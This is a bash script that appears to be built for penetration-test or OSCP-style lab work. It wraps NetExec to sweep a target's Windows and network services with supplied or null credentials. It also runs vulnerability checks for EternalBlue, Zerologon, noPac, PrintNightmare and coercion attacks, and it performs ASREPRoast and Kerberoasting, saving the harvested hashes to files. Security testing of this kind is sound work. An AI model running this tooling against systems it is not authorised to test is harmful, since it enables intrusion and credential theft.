#!/bin/bash

# --- Colors ---
BLUE='\033[0;34m'
YELLOW='\033[38;5;226m'
GREEN='\033[0;32m'
GREY='\033[38;5;244m'


# --- Help Menu ---
usage() {
    echo -e "${YELLOW}Usage: nxc-sweep <IP> [-u <username>] [-p <password>] [--no-vulns|--vulns-only] [global flags]"
    echo -e "${GREY}       Empty/omitted -u/-p => null session (anonymous), e.g.:"
    echo -e "${GREY}         nxc-sweep 10.10.10.5 -u '' -p ''"
    echo -e "${GREY}         nxc-sweep 10.10.10.5"
    echo -e "${GREY}       --no-vulns    : protocol sweep only, skip MS17-010 / Zerologon / etc"
    echo -e "${GREY}       --vulns-only  : skip protocol sweep, run Windows vuln modules only"
    echo -e "${GREY}       --no-guest    : skip the default SMB guest-account fallback"
    echo -e "${GREY}       --no-roast    : skip post-auth ASREPRoast / Kerberoasting (default: run when creds valid)"
    echo -e "${GREY}       --dc <host>   : LDAP target for ASREPRoast/Kerberoasting (use when <IP> is not a DC)"
    echo -e "${GREY}       Hash/domain/KDC pass as global flags: -H <hash>, -d <domain>, --kdcHost <ip>"
    exit 1
}


# pulls IP first like in native nxc syntax
if [[ -z "$1" || "$1" == -* ]]; then
    usage
fi

TARGET=$1
shift # shifts arguments over so $2 becomes $1, etc.

# parses the remaining flags (-u, -p, and anything else like --local-auth)
# USER/PASS default to "" so an omitted flag behaves like a null session
USER=""
PASS=""
RUN_VULNS=1          # run Windows vuln modules on SMB by default
VULNS_ONLY=0         # skip the protocol sweep, only run vuln modules
RUN_GUEST=1          # also try the SMB guest account by default (null-session fallback)
RUN_ROAST=1          # run ASREPRoast / Kerberoasting when credentials authenticate
DC_TARGET=""         # optional LDAP target for roast (set with --dc)
GLOBAL_FLAGS=()
while [[ "$#" -gt 0 ]]; do
    case $1 in
        -u) USER=$2; shift 2 ;;
        -p) PASS=$2; shift 2 ;;
        --dc) DC_TARGET=$2; shift 2 ;;
        --no-vulns) RUN_VULNS=0; shift 1 ;;
        --vulns-only) VULNS_ONLY=1; shift 1 ;;
        --no-guest) RUN_GUEST=0; shift 1 ;;
        --no-roast) RUN_ROAST=0; shift 1 ;;
        *) GLOBAL_FLAGS+=("$1"); shift 1 ;;
    esac
done

# When an NTLM hash is supplied via -H, do not also send an empty -p "":
# that produces a spurious STATUS_LOGON_FAILURE before the real hash attempt.
HAS_HASH=0
for g in "${GLOBAL_FLAGS[@]}"; do
    [[ "$g" == "-H" || "$g" == "--hash" ]] && HAS_HASH=1
done


# validation: only the target is mandatory. Empty -u/-p == null session.
if [[ -z "$TARGET" ]]; then
    usage
fi

DISPLAY_USER="$USER"
[[ -z "$USER" && -z "$PASS" ]] && DISPLAY_USER="<null session>"

echo -e "${BLUE}[*] Starting NXC sweep for $TARGET as $DISPLAY_USER ...\n"

# --- Protocol Handler ---
check_and_run() {
    local PORT=$1
    local PROTO=$2
    shift 2 

    # checks if the port is open before running NXC to save time
    if nc -z -w 1 "$TARGET" "$PORT" 2>/dev/null; then
        echo -e "${GREEN}[+] Port $PORT open. Checking ${PROTO} ..."
        
        local EXTRA_FLAGS=("$@")
        local SAFE_GLOBAL_FLAGS=()

        # filters out --local-auth for FTP to prevent crashes
        for flag in "${GLOBAL_FLAGS[@]}"; do
            if [[ "$PROTO" == "ftp" && "$flag" == "--local-auth" ]]; then
                continue # Skip this specific flag
            fi
            SAFE_GLOBAL_FLAGS+=("$flag")
        done

        # credentials: -u always; -p only when no hash is being used
        local AUTH_FLAGS=(-u "$USER")
        [[ "$HAS_HASH" -eq 0 ]] && AUTH_FLAGS+=(-p "$PASS")

        # run normally for everything to preserve native NXC colors
        nxc "$PROTO" "$TARGET" "${AUTH_FLAGS[@]}" "${SAFE_GLOBAL_FLAGS[@]}" "${EXTRA_FLAGS[@]}"

    else
        echo -e "${GREY}[-] Port $PORT closed/filtered. Skipping ${PROTO}"
    fi
    echo ""
}

# --- SMB guest fallback ---
# A true null session (-u '') is frequently refused for share enumeration on
# modern/hardened Windows (STATUS_ACCESS_DENIED + conn reset 104), while the
# guest account mapped to a blank password still lists shares. Run it by
# default unless the caller is already authenticating as guest.
check_smb_guest() {
    [[ "${USER,,}" == "guest" ]] && return
    if nc -z -w 1 "$TARGET" 445 2>/dev/null; then
        # guest fallback is a clean blank-password probe: drop any operator
        # NTLM hash (-H/--hash) and its value so it is not tried as guest.
        local GUEST_FLAGS=()
        local skip=0
        for flag in "${GLOBAL_FLAGS[@]}"; do
            if [[ "$skip" -eq 1 ]]; then
                skip=0
                continue
            fi
            if [[ "$flag" == "-H" || "$flag" == "--hash" ]]; then
                skip=1
                continue
            fi
            GUEST_FLAGS+=("$flag")
        done

        echo -e "${GREEN}[+] SMB guest fallback (-u guest -p '') ..."
        nxc smb "$TARGET" -u "guest" -p "" "${GUEST_FLAGS[@]}" --shares
        echo ""
    fi
}

# --- Windows vuln sweep (SMB modules) ---
# ms17-010 / smbghost work unauthenticated; the DC-side checks (zerologon,
# nopac, printnightmare, coerce_plus) run anonymously too but may need creds
# on hardened DCs. spooler/webdav are coercion-relay prerequisites.
run_vulns() {
    if ! nc -z -w 1 "$TARGET" 445 2>/dev/null; then
        echo -e "${GREY}[-] Port 445 closed/filtered. Skipping Windows vuln checks"
        echo ""
        return
    fi

    echo -e "${GREEN}[+] Port 445 open. Running Windows vuln modules ...\n"

    # module list: name -> printed comment
    local MODULES=(
        "ms17-010|EternalBlue (CVE-2017-0144)"
        "smbghost|SMBGhost / CVE-2020-0796 (SMBv3.1.1 compression)"
        "zerologon|Zerologon / CVE-2020-1472 (DC)"
        "nopac|noPac / CVE-2021-42278+42287 (DC)"
        "printnightmare|PrintNightmare / CVE-2021-1675/34527"
        "coerce_plus|Coerce (PetitPotam/DFSCoerce/ShadowCoerce/PrinterBug)"
        "spooler|Print Spooler enabled (PrinterBug relay prereq)"
        "webdav|WebClient/WebDAV running (relay prereq)"
    )

    local AUTH_FLAGS=(-u "$USER")
    [[ "$HAS_HASH" -eq 0 ]] && AUTH_FLAGS+=(-p "$PASS")

    for entry in "${MODULES[@]}"; do
        local MOD="${entry%%|*}"
        local DESC="${entry#*|}"
        echo -e "${BLUE}[*] ${MOD} — ${DESC}"
        nxc smb "$TARGET" "${AUTH_FLAGS[@]}" "${GLOBAL_FLAGS[@]}" -M "$MOD"
        echo ""
    done
}

# --- Kerberos attacks (post-auth only) ---
# Kerberoasting / ASREPRoast require LDAP against a domain controller, which
# may differ from the swept host. Target the DC directly (--dc), or fall back
# to $TARGET. nxc ldap only dispatches --asreproast / --kerberoasting after a
# successful login, so a plain nxc ldap call gates them for us.
check_roast() {
    [[ "$RUN_ROAST" -eq 1 ]] || return

    [[ -z "$USER" ]] && {
        echo -e "${GREY}[-] No username (-u). Skipping ASREPRoast/Kerberoasting."
        return
    }
    [[ "${USER,,}" == "guest" ]] && return

    local HASH="" DOMAIN="" KDC_HOST=""
    local i g
    for ((i=0; i<${#GLOBAL_FLAGS[@]}; i++)); do
        g="${GLOBAL_FLAGS[i]}"
        case "$g" in
            -H|--hash) HASH="${GLOBAL_FLAGS[i+1]}" ;;
            -d) DOMAIN="${GLOBAL_FLAGS[i+1]}" ;;
            --kdcHost|--kdc-host) KDC_HOST="${GLOBAL_FLAGS[i+1]}" ;;
        esac
    done

    if [[ -z "$PASS" && -z "$HASH" ]]; then
        echo -e "${GREY}[-] No password (-p) or hash (-H). Skipping ASREPRoast/Kerberoasting."
        return
    fi

    # roast goes to the DC (or the swept host if it doubles as one)
    local ROAST_TARGET="${DC_TARGET:-$TARGET}"

    if ! nc -z -w 1 "$ROAST_TARGET" 389 2>/dev/null; then
        if [[ -n "$DC_TARGET" ]]; then
            echo -e "${GREY}[-] LDAP (389) closed on DC $ROAST_TARGET. Skipping ASREPRoast/Kerberoasting"
        else
            echo -e "${GREY}[-] LDAP (389) closed on $ROAST_TARGET. Skipping ASREPRoast/Kerberoasting (this box is not a DC; use --dc <dc-ip>)"
        fi
        return
    fi

    # target speaks Kerberos => it is the KDC; use it to dodge unresolvable
    # domain names (e.g. "OSCP.EXAM:88 ... name or service not known").
    if [[ -z "$KDC_HOST" ]] && nc -z -w 1 "$ROAST_TARGET" 88 2>/dev/null; then
        KDC_HOST="$ROAST_TARGET"
    fi

    local SAFE="${ROAST_TARGET//[^a-zA-Z0-9._-]/_}"
    local ASREP="asreproast_${SAFE}.txt"
    local KERB="kerberoasting_${SAFE}.txt"

    local CMD=(nxc ldap "$ROAST_TARGET" -u "$USER")
    [[ -n "$HASH" ]] && CMD+=(-H "$HASH") || CMD+=(-p "$PASS")
    [[ -n "$DOMAIN" ]] && CMD+=(-d "$DOMAIN")
    [[ -n "$KDC_HOST" ]] && CMD+=(--kdcHost "$KDC_HOST")
    CMD+=(--asreproast "$ASREP" --kerberoasting "$KERB")

    echo -e "${GREEN}[+] LDAP on $ROAST_TARGET reachable. Running ASREPRoast + Kerberoasting ..."
    "${CMD[@]}"

    if [[ -s "$ASREP" ]]; then
        echo -e "${BLUE}[*] ASREPRoast hashes -> $ASREP"
    else
        echo -e "${GREY}[-] No ASREPRoast-able accounts (no hashes written)."
    fi
    if [[ -s "$KERB" ]]; then
        echo -e "${BLUE}[*] Kerberoasting hashes -> $KERB"
    else
        echo -e "${GREY}[-] No kerberoastable accounts / tickets (no hashes written)."
    fi
}

# --- Protocols ---
if [[ "$VULNS_ONLY" -eq 0 ]]; then
    check_and_run 445 "smb" "--shares"
    [[ "$RUN_GUEST" -eq 1 ]] && check_smb_guest
    check_and_run 5985 "winrm"
    check_and_run 3389 "rdp"
    check_and_run 1433 "mssql" -q "SELECT name FROM master.sys.databases;"
    check_and_run 21 "ftp" "--ls"
    check_and_run 389 "ldap" "--users"
    check_and_run 22 "ssh"
    check_and_run 135 "wmi"
    check_and_run 5900 "vnc"
    check_and_run 2049 "nfs" "--shares"
fi

# --- Windows vuln modules ---
if [[ "$RUN_VULNS" -eq 1 || "$VULNS_ONLY" -eq 1 ]]; then
    echo -e "${BLUE}[*] --- Windows vulnerability checks ---\n"
    run_vulns
fi

# --- Kerberos attacks (ASREPRoast / Kerberoasting) ---
echo -e "${BLUE}[*] --- Kerberos attack checks ---\n"
check_roast

echo -e "${BLUE}[*] All active services checked."
